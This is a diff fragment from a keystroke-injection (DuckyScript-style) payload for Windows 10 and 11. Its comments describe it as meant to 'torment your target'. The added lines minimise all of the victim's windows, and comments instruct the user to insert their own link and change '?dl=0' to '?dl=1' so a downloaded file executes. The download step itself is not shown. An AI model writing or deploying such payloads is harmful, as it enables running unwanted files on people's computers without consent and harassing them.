@@ -6,6 +6,10 @@ REM     Description: This payload is meant to torment your target to the fullest
 
 REM     Target: Windows 10, 11
 
+REM     Start by minimizing all their current windows
+GUI m
+DELAY 500
+
 REM     Remember to replace the link with your link for the intended file to download if you are using a custom variation of this payload
 REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly
 
